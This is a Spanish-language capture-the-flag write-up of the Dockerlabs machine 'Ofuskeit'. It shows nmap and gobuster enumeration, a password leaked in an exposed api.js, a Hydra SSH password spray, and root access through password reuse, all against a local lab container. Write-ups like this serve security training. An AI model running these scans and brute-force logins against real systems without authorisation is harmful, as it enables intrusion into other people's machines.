# 🎯 Writeup: Máquina Ofuskeit (Dockerlabs) 

Por: Dani-kl

Este es un writeup detallado sobre la resolución de la máquina **Ofuskeit**. Durante este ejercicio, abarcaremos fases de reconocimiento de puertos, enumeración de servicios web, análisis de código expuesto, ataques de fuerza bruta y escalada de privilegios mediante reutilización de contraseñas.

## 🛠️ 1. Despliegue del Entorno

Comenzamos desplegando la máquina vulnerable utilizando el script proporcionado por Dockerlabs.

```
sudo bash auto_deploy.sh ofuskeit.tar

```

**Resultado:**

```
[sudo] password for user:

    _   _   _   _   _   _   _   _   _   _  
   / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
  ( D | O | C | K | E | R | L | A | B | S )
   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

## 🔍 2. Reconocimiento (Recon)

Una vez que tenemos la IP objetivo (`172.17.0.2`), procedemos a realizar un escaneo de puertos utilizando **Nmap**. Es una buena práctica realizar primero un escaneo rápido para descubrir puertos abiertos y luego un escaneo detallado sobre esos puertos específicos.

### Descubrimiento de puertos abiertos:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

```

El escaneo nos revela 3 puertos abiertos: **22 (SSH), 80 (HTTP) y 3000 (HTTP/Node.js)**.

### Escaneo de servicios y versiones:

Con los puertos identificados, lanzamos scripts básicos de reconocimiento y detección de versiones:

```
nmap -sCV -p22,80,3000 172.17.0.2

```

**Resultado:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Servicios de Mantenimiento Informático
3000/tcp open  http    Node.js Express framework
|_http-title: Error

```

## 🌐 3. Enumeración Web y Fuga de Información

Teniendo dos puertos web (80 y 3000), comenzamos a enumerar el servidor web buscando directorios y archivos ocultos. Para esto utilizamos **Gobuster**.

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x js,php,html,txt

```

**Resultado:**

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              js,php,html,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api.js               (Status: 200) [Size: 450]
/index.html           (Status: 200) [Size: 112]
===============================================================

```

El escaneo revela un archivo interesante llamado `api.js`. Al acceder a él (`http://172.17.0.2/api.js`), encontramos código fuente expuesto de la API (Node.js/Express) que corre en el puerto 3000.

Analizando el código, observamos una condicional que evalúa un token. Si el token es válido, devuelve el siguiente mensaje:

```
// Fragmento de código expuesto en api.js
if (token === tokenValido) {
    return res.send("... Acceso concedido. Contraseña chocolate123");
}

```

¡Hemos encontrado una posible contraseña (`chocolate123`)!

## 💥 4. Fuerza Bruta por SSH (Buscando el usuario)

Tenemos una contraseña válida, pero no sabemos a qué usuario pertenece (ya que el servicio SSH en el puerto 22 está abierto). Para descubrir el usuario, preparamos un ataque de fuerza bruta inversa (password spraying) utilizando **Hydra**.

*Nota: Usaremos una lista de usuarios comunes (o podemos adaptar rockyou para buscar usuarios) junto con la contraseña descubierta.*

```
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p chocolate123 172.17.0.2 ssh

```

**Resultado:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-30 18:10:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: admin   password: chocolate123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-30 18:10:15

```

Hydra nos confirma que las credenciales **`admin:chocolate123`** son válidas para el servicio SSH.

## 🚪 5. Acceso Inicial (Initial Access)

Procedemos a autenticarnos a través de SSH con las credenciales obtenidas para conseguir nuestra primera shell en el sistema.

```
ssh admin@172.17.0.2

```

**Resultado:**

```
admin@172.17.0.2's password: [chocolate123]

admin@1c399672a58f:~$ whoami
admin

```

¡Estamos dentro de la máquina como el usuario `admin`!

## 🚀 6. Escalada de Privilegios (Privilege Escalation)

Una vez dentro, realizamos una enumeración básica del sistema. Una de las primeras comprobaciones en materia de escalada de privilegios es validar la reutilización de contraseñas. Es común que los administradores utilicen la misma contraseña para cuentas rasas y cuentas privilegiadas.

Intentamos pivotar al usuario `root` proporcionando la misma contraseña que encontramos anteriormente (`chocolate123`).

```
su root

```

**Resultado:**

```
admin@1c399672a58f:~$ su root
Password: [chocolate123]
root@1c399672a58f:/home/admin# whoami
root
root@1c399672a58f:/home/admin# 

```

¡Éxito! Hemos logrado comprometer el sistema en su totalidad (Pwned). La vulnerabilidad principal en este caso radicó en la **exposición de información sensible (Information Disclosure)** en un archivo público (`api.js`) y la **reutilización de contraseñas (Password Reuse)** para usuarios con privilegios elevados.